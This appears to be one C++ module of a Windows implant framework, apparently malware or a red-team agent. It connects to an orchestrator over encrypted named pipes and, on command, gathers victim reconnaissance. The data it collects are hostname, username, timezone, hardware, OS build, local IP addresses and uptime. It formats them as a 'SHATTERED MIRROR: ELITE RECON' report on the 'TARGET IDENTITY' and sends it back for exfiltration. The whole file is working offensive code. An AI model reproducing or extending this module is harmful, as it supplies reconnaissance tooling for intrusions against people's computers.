#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include "Atom_03_Sys.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdio>
#include <cstring>
#include <iphlpapi.h>
#include <string>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")

extern SYSCALL_TABLE g_SyscallTable;

static std::string GetLocalIPs() {
    std::string ips = "";
    ULONG outBufLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO *)malloc(outBufLen);
    if (GetAdaptersInfo(pAdapterInfo, &outBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(outBufLen);
    }
    if (GetAdaptersInfo(pAdapterInfo, &outBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            if (strlen(pAdapter->IpAddressList.IpAddress.String) > 0 && 
                strcmp(pAdapter->IpAddressList.IpAddress.String, "0.0.0.0") != 0) {
                ips += pAdapter->IpAddressList.IpAddress.String;
                ips += " ("; ips += pAdapter->Description; ips += "), ";
            }
            pAdapter = pAdapter->Next;
        }
    }
    if (pAdapterInfo) free(pAdapterInfo);
    return ips.empty() ? "N/A" : ips;
}

static std::string GetGPUInfo() {
    DISPLAY_DEVICEA dd;
    dd.cb = sizeof(dd);
    // Find the primary display device
    for (int i = 0; EnumDisplayDevicesA(NULL, i, &dd, 0); i++) {
        if (dd.StateFlags & DISPLAY_DEVICE_PRIMARY_DEVICE) {
            return std::string(dd.DeviceString);
        }
    }
    // Fallback to the first one found if no primary marked
    if (EnumDisplayDevicesA(NULL, 0, &dd, 0)) {
        return std::string(dd.DeviceString);
    }
    return "Unknown GPU";
}

static std::string GetSystemModel() {
    char manufacturer[128] = "Unknown";
    char product[128] = "Unknown";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD sz = sizeof(manufacturer);
        RegQueryValueExA(hKey, "SystemManufacturer", NULL, NULL, (LPBYTE)manufacturer, &sz);
        sz = sizeof(product);
        RegQueryValueExA(hKey, "SystemProductName", NULL, NULL, (LPBYTE)product, &sz);
        RegCloseKey(hKey);
    }
    std::string result = manufacturer;
    result += " ";
    result += product;
    return result;
}

static std::string GetDetailedOS() {
    char productName[256] = "Windows";
    char editionId[64] = "";
    char build[64] = "0";
    char displayVersion[64] = "";
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD sz = sizeof(productName);
        RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)productName, &sz);
        sz = sizeof(editionId);
        RegQueryValueExA(hKey, "EditionID", NULL, NULL, (LPBYTE)editionId, &sz);
        sz = sizeof(build);
        RegQueryValueExA(hKey, "CurrentBuild", NULL, NULL, (LPBYTE)build, &sz);
        sz = sizeof(displayVersion);
        RegQueryValueExA(hKey, "DisplayVersion", NULL, NULL, (LPBYTE)displayVersion, &sz);
        RegCloseKey(hKey);
    }

    int buildNum = atoi(build);
    std::string finalName = productName;

    // Hard-Real logic: Windows 11 reports as Windows 10 in many registry keys 
    // for app compatibility. We override this based on the actual build number.
    if (buildNum >= 22000) {
        if (finalName.find("Windows 10") != std::string::npos) {
            size_t pos = finalName.find("Windows 10");
            finalName.replace(pos, 10, "Windows 11");
        } else if (finalName == "Windows") {
            // Fallback for stripped OS versions: Use EditionID
            finalName = "Windows 11 " + std::string(editionId);
        }
    }
    
    // Add the specific release version (like 23H2 or 24H2)
    if (strlen(displayVersion) > 0) {
        finalName += " " + std::string(displayVersion);
    }
    
    // Always include the literal build number for 100% certainty
    finalName += " (Build " + std::string(build) + ")";

    return finalName;
}

static std::string GetTimeZone() {
    TIME_ZONE_INFORMATION tzi;
    DWORD res = GetTimeZoneInformation(&tzi);
    char buf[128];
    // Convert wide string to char
    char tzName[64] = {0};
    WideCharToMultiByte(CP_ACP, 0, tzi.StandardName, -1, tzName, sizeof(tzName), NULL, NULL);
    sprintf_s(buf, "UTC%ld (%s)", -tzi.Bias / 60, tzName);
    return std::string(buf);
}

static std::string GetPowerStatus() {
    SYSTEM_POWER_STATUS sps;
    if (GetSystemPowerStatus(&sps)) {
        std::string res = (sps.ACLineStatus == 1) ? "AC Power" : "Battery";
        if (sps.BatteryLifePercent != 255) {
            res += " (";
            res += std::to_string((int)sps.BatteryLifePercent);
            res += "%)";
        }
        return res;
    }
    return "N/A";
}

static std::string CollectFullSysInfo() {
    char szHost[256] = {0}; DWORD dHost = sizeof(szHost);
    char szUser[256] = {0}; DWORD dUser = sizeof(szUser);
    GetComputerNameA(szHost, &dHost);
    GetUserNameA(szUser, &dUser);

    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    const char* arch = (si.wProcessorArchitecture == 9) ? "x64" : (si.wProcessorArchitecture == 0) ? "x86" : "ARM/Other";

    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    DWORDLONG ram = mem.ullTotalPhys / (1024 * 1024);

    char cpu[256] = "Unknown CPU";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD sz = sizeof(cpu);
        RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)cpu, &sz);
        RegCloseKey(hKey);
    }

    char report[4096];
    sprintf_s(report, 
        "\n--- SHATTERED MIRROR: ELITE RECON ---\n"
        "[TARGET IDENTITY]\n"
        " ├─ Hostname   : %s\n"
        " ├─ Username   : %s\n"
        " └─ Timezone   : %s\n\n"
        "[HARDWARE PROFILE]\n"
        " ├─ System     : %s\n"
        " ├─ Power      : %s\n"
        " ├─ CPU        : %s\n"
        " ├─ GPU        : %s\n"
        " ├─ RAM        : %llu MB\n"
        " └─ Cores      : %u logical\n\n"
        "[OS DEPLOYMENT]\n"
        " ├─ Platform   : %s\n"
        " └─ Arch       : %s\n\n"
        "[NETWORK TOPOLOGY]\n"
        " └─ IPv4       : %s\n\n"
        "[SESSION METRICS]\n"
        " └─ Uptime     : %llu seconds\n"
        "------------------------------------\n",
        szHost, szUser, GetTimeZone().c_str(), GetSystemModel().c_str(), GetPowerStatus().c_str(), 
        cpu, GetGPUInfo().c_str(), ram, si.dwNumberOfProcessors, GetDetailedOS().c_str(), arch, GetLocalIPs().c_str(), GetTickCount64()/1000);

    return std::string(report);
}

DWORD WINAPI SystemInfoAtomMain(LPVOID lpParam) {
    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
    HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
    HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
    if (!hCmdPipe || !hReportPipe) return 1;

    BYTE SharedSessionKey[16];
    memcpy(SharedSessionKey, Config::PSK_ID, 16);

    IPC_MESSAGE readyMsg = {0};
    readyMsg.dwSignature = 0x534D4952;
    readyMsg.CommandId = CMD_READY;
    IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);

    // Removed redundant startup report to prevent duplicate output.
    // The report will be sent when the Orchestrator sends the BALE_RUN command.

    while (TRUE) {
        DWORD dwAvail = 0;
        if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
            IPC_MESSAGE inMsg = {0};
            if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
                if (inMsg.CommandId == CMD_EXECUTE) {
                    std::string fresh = CollectFullSysInfo();
                    IPC_MESSAGE bMsg = {0};
                    bMsg.dwSignature = 0x534D4952;
                    bMsg.CommandId = CMD_REPORT;
                    bMsg.AtomId = dwAtomId;
                    bMsg.dwPayloadLen = (DWORD)fresh.length();
                    memcpy(bMsg.Payload, fresh.c_str(), bMsg.dwPayloadLen);
                    IPC_SendMessage(hReportPipe, &bMsg, SharedSessionKey, 16);
                } else if (inMsg.CommandId == CMD_TERMINATE) {
                    break;
                }
            }
        }
        Sleep(500);
    }
    CloseHandle(hCmdPipe);
    CloseHandle(hReportPipe);
    return 0;
}